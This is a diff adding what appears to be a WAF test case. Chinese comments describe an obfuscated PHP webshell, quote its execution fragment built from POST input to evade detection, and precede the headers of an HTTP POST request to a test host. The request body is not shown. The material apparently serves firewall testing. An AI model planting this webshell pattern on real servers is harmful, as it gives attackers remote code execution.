@@ -1,0 +1,15 @@
+# webshell_bypass_8
+# 这段PHP代码是一个Webshell，其功能流程如下：首先，通过混淆的方式构造了一个特殊的变量$__，其值为_POST。然后，通过@${$__}[!$_](${$__}[$_])的方式，使用_POST数组中的参数来执行任意PHP代码，绕过直接引用_POST的检测。攻击者可以通过HTTP POST请求传递要执行的PHP代码，然后该代码将被解析和执行，可能导致服务器受到滥用。
+# 基本信息：
+# - 文件名：waf/webshell_bypass_8.php
+# - 文件大小：128B
+# 行为描述：
+# - 命令执行：接收并执行攻击者发送的系统命令，例如列出目录内容、修改文件权限等。
+POST /?bid=hd_tag_m8mv23sc HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23sc
+RM-PRO-Token: 0487363ddb3e8ca50d19f1e4f9f5fc41
+RM-PRO-Time: 1742808341972
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=Cq19bIIrImCMRZXbsDgrfQ8uUDslg14i
+
